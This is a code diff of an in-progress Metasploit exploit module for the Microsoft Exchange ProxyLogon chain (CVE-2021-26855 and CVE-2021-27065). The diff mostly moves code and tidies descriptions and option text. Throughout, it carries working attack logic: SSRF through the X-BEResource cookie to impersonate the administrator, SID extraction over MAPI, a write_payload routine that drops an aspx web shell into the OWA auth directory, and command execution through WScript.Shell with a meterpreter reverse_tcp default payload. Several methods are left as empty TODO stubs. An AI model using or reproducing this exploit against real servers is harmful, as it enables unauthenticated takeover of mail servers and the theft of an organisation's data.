@@ -12,17 +12,15 @@ class MetasploitModule < Msf::Exploit::Remote
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'                => 'Microsoft Exchange ProxyLogon RCE',
-      'Description'         => %q{
-        This module scan for a vulnerability on Microsoft Exchange Server that
-        allows an attacker bypassing the authentication and impersonating as the
-        admin (CVE-2021-26855).
+      'Name' => 'Microsoft Exchange ProxyLogon RCE',
+      'Description' => %q{
+        This module exploit a vulnerability on Microsoft Exchange Server that
+        allows an attacker bypassing the authentication, impersonating as the
+        admin (CVE-2021-26855) and write arbitrary file (CVE-2021-27065) to get
+        the RCE (Remote Code Execution).
 
-        By chaining this bug with another post-auth arbitrary-file-write
-        vulnerability to get code execution (CVE-2021-27065).
-
-        As a result, an unauthenticated attacker can execute arbitrary commands on
-        Microsoft Exchange Server.
+        By taking advantage of this vulnerability, you can execute arbitrary
+        commands on the remote Microsoft Exchange Server.
 
         This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012,
         Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009,
@@ -30,50 +28,55 @@ class MetasploitModule < Msf::Exploit::Remote
 
         All components are vulnerable by default.
       },
-      'Author'              => [
+      'Author' => [
         'mekhalleh (RAMELLA Sébastien)', # Module author (Zeop Entreprise)
-        'DEWOLF Francois'                # Zeop Entreprise
+        'DEWOLF François'                # Zeop Entreprise
+        # TODO
       ],
-      'References'          => [
+      'References' => [
         ['CVE', '2021-26855'],
         ['CVE', '2021-27065']
+        # TODO
       ],
-      'DisclosureDate'      => '2021-03-02',
-      'License'             => MSF_LICENSE,
-      'DefaultOptions'      => {
-        'CheckModule'       => 'auxiliary/scanner/http/exchange_proxylogon',
+      'DisclosureDate' => '2021-03-02',
+      'License' => MSF_LICENSE,
+      'DefaultOptions' => {
+        'CheckModule' => 'auxiliary/scanner/http/exchange_proxylogon',
         'HttpClientTimeout' => 3.5,
         'RPORT' => 443,
         'SSL' => true,
         'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
         'CmdStagerFlavor' => 'psh_invokewebrequest'
       },
-      'Platform'            => ['windows'],
-        'Arch'                => [ARCH_X64],
-        'Privileged'          => true,
-      'Targets'             => [
+      'Platform' => ['windows'],
+        'Arch' => [ARCH_X64],
+        'Privileged' => true,
+      'Targets' => [
         ['Automatic', {}],
       ],
-      'DefaultTarget'       => 0,
-      'Notes'               => {
-        'AKA'               => ['ProxyLogon']
+      'DefaultTarget' => 0,
+      'Notes' => {
+        'AKA' => ['ProxyLogon']
       }
     ))
 
     register_options([
-      OptString.new('EMAIL', [true, 'TODO']),
-      OptEnum.new('METHOD', [true, 'HTTP Method to use for the check.', 'POST', ['GET', 'POST']])
+      OptString.new('EMAIL', [true, 'A known email address for this organization']),
+      OptEnum.new('METHOD', [true, 'HTTP Method to use for the check', 'POST', ['GET', 'POST']])
     ])
 
     register_advanced_options([
       OptBool.new('ForceExploit', [false, 'Override check result', false]),
-      OptString.new('MapiClientApp', [true, 'TODO', 'Outlook/15.0.4815.1002']),
-      OptString.new('UserAgent', [true, 'TODO', 'Mozilla/5.0'])
+      OptString.new('MapiClientApp', [true, 'This is MAPI client version sent in the request', 'Outlook/15.0.4815.1002']),
+      OptString.new('UserAgent', [true, 'The HTTP User-Agent sent in the request', 'Mozilla/5.0'])
     ])
   end
 
 
 
+
+
+  # TODO
   def execute_command(cmd, _opts = {})
     
     cmd = "Response.Write(new ActiveXObject(\"WScript.Shell\").Exec(\"cmd /c #{cmd.gsub('"', "\"")}\").StdOut.ReadAll());"
@@ -87,6 +90,9 @@ class MetasploitModule < Msf::Exploit::Remote
     )
 
   end
+
+
+
 
 
 
@@ -119,6 +125,11 @@ class MetasploitModule < Msf::Exploit::Remote
     true
   end
 
+
+
+
+
+
   def message(msg)
     "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
   end
@@ -130,51 +141,44 @@ class MetasploitModule < Msf::Exploit::Remote
     xml = Nokogiri::XML.parse(response.body)
 
     legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns).content
-    fail_with(Failure::Unknown, 'The `LegacyDN` value could not be found') if legacy_dn.empty?
+    fail_with(Failure::Unknown, 'No \'LegacyDN\' was found') if legacy_dn.empty?
 
     server = ''
-    owa_urls = []
-    xml.xpath("//xmlns:Account/xmlns:Protocol", xmlns).each do|item|
+    xml.xpath("//xmlns:Account/xmlns:Protocol", xmlns).each do |item|
       type = item.at_xpath('./xmlns:Type', xmlns).content
       if type == 'EXCH'
         server = item.at_xpath("./xmlns:Server", xmlns).content
       end
-
-      if type == 'WEB'
-        item.xpath("./xmlns:Internal/xmlns:OWAUrl", xmlns).each do|owa_url|
-          owa_urls << owa_url.content
-        end
-      end
     end
-    fail_with(Failure::Unknown, 'No `OWAUrl` was found') unless owa_urls.length > 0
+    fail_with(Failure::Unknown, 'No \'Server ID\' was found') if server.empty?
 
-    return([server, legacy_dn, owa_urls])
+    [server, legacy_dn]
   end
 
   def request_mapi(server_name, legacy_dn, server_id)
-    mapi_data = "#{legacy_dn}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
+    data = "#{legacy_dn}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
 
     sid = ''
-    response = send_mapi(mapi_data, "Admin@#{server_name}:444/mapi/emsmdb?MailboxId=#{server_id}&a=~1942062522")
+    response = send_mapi(data, "Admin@#{server_name}:444/mapi/emsmdb?MailboxId=#{server_id}&a=~1942062522")
     if response.code == 200 && response.body =~ /act as owner of a UserMailbox/
       sid_regex = /S-[0-9]{1}-[0-9]{1}-[0-9]{2}-[0-9]{10}-[0-9]{9}-[0-9]{10}-[0-9]{3,4}/
       sid = response.body.match(sid_regex)
     end
-    fail_with(Failure::Unknown, 'No `SID` was found') if sid.to_s.empty?
-    
+    fail_with(Failure::Unknown, 'No \'SID\' was found') if sid.to_s.empty?
+
     sid
   end
 
   def request_oab(server_name, sid, canary)
     data = {
-      "filter": {
-        "Parameters": {
-          "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
-          "SelectedView": "",
-          "SelectedVDirType": "OAB"
+      'filter': {
+        'Parameters': {
+          '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
+          'SelectedView': '',
+          'SelectedVDirType': 'OAB'
         }
       },
-      "sort": {}
+      'sort': {}
     }.to_json
 
     response = send_http(
@@ -194,35 +198,7 @@ class MetasploitModule < Msf::Exploit::Remote
       end
     end
 
-    fail_with(Failure::Unknown, 'No `OAB Id` was found')
-  end
-
-  def write_payload(server_name, sid, canary, oab_id)
-    shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\todo.aspx"
-    shell_path = "\\\\127.0.0.1\\c$\\#{shell_path}"
-
-    data = {
-      "identity": {
-        "__type": "Identity:ECP",
-        "DisplayName": "#{oab_id[0]}",
-        "RawIdentity": "#{oab_id[1]}"
-      },
-      "properties": {
-        "Parameters": {
-          "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
-          "FilePathName": "#{shell_path}"
-        }
-      }
-    }.to_json
-
-    response = send_http(
-      'POST',
-      "Admin@#{server_name}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=#{canary}&a=~1942062522",
-      data,
-      'application/json; charset=utf-8',
-      { 'msExchLogonMailbox' => sid }
-    )
-    #TODO
+    fail_with(Failure::Unknown, 'No \'OAB Id\' was found')
   end
 
   def resqest_proxylogon(server_name, sid)
@@ -234,17 +210,19 @@ class MetasploitModule < Msf::Exploit::Remote
         session_id = response.get_cookies.scan(/ASP\.NET_SessionId=([\w\-]+);/).flatten[0]
         canary = response.get_cookies.scan(/msExchEcpCanary=([\w\-\_\.]+);*/).flatten[0] # coin coin coin ...
     end
-    fail_with(Failure::Unknown, 'Could\'t get the \'ASP.NET_SessionId\' from the headers response') if session_id.empty?
-    fail_with(Failure::Unknown, 'Could\'t get the \'msExchEcpCanary\' from the headers response') if canary.empty?
+    fail_with(Failure::Unknown, 'No \'ASP.NET_SessionId\' was found') if session_id.empty?
+    fail_with(Failure::Unknown, 'No \'msExchEcpCanary\' was found') if canary.empty?
 
-    return([session_id, canary])
+    [session_id, canary]
   end
 
-  def send_http(method, ssrf, data = '', ctype = 'application/x-www-form-urlencoded', headers = '')
+  def send_http(method, ssrf, data = '', ctype = '', headers = '')
     cookie = "X-BEResource=#{ssrf};"
     if @session
       cookie = "X-BEResource=#{ssrf}; #{@session}"
     end
+
+    ctype = 'application/x-www-form-urlencoded' if ctype.empty?
 
     request = {
       'method' => method,
@@ -262,6 +240,7 @@ class MetasploitModule < Msf::Exploit::Remote
     received
   end
 
+  # https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcmapihttp/c245390b-b115-46f8-bc71-03dce4a34bff
   def send_mapi(data, ssrf)
     request = {
       'method' => 'POST',
@@ -283,6 +262,11 @@ class MetasploitModule < Msf::Exploit::Remote
     received
   end
 
+
+
+
+
+  # TODO: remove!
   def send_xml(data, ssrf, headers = '')
     request = {
       'method' => 'POST',
@@ -300,6 +284,11 @@ class MetasploitModule < Msf::Exploit::Remote
     received
   end
 
+
+
+
+
+
   def soap_autodiscover
     <<~SOAP
       <?xml version="1.0" encoding="utf-8"?>
@@ -311,6 +300,57 @@ class MetasploitModule < Msf::Exploit::Remote
       </Autodiscover>
     SOAP
   end
+
+
+
+
+
+  # TODO
+  def write_payload(server_name, sid, canary, oab_id)
+    remote_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\todo.aspx"
+    remote_path = "\\\\127.0.0.1\\c$\\#{remote_path}"
+
+    data = {
+      'identity': {
+        '__type': 'Identity:ECP',
+        'DisplayName': "#{oab_id[0]}",
+        'RawIdentity': "#{oab_id[1]}"
+      },
+      'properties': {
+        'Parameters': {
+          '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
+          'FilePathName': "#{remote_path}"
+        }
+      }
+    }.to_json
+
+    response = send_http(
+      'POST',
+      "Admin@#{server_name}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=#{canary}&a=~1942062522",
+      data,
+      'application/json; charset=utf-8',
+      { 'msExchLogonMailbox' => sid }
+    )
+    #TODO
+  end
+
+
+
+
+
+  # pre-authentication SSRF (Server Side Request Forgery) + impersonate as asmin.
+  def run_cve_2021_26855
+
+  end
+
+  # post-auth arbitrary file write.
+  def run_cve_2021_27065
+
+  end
+
+
+
+
 
   def exploit
     unless datastore['ForceExploit']
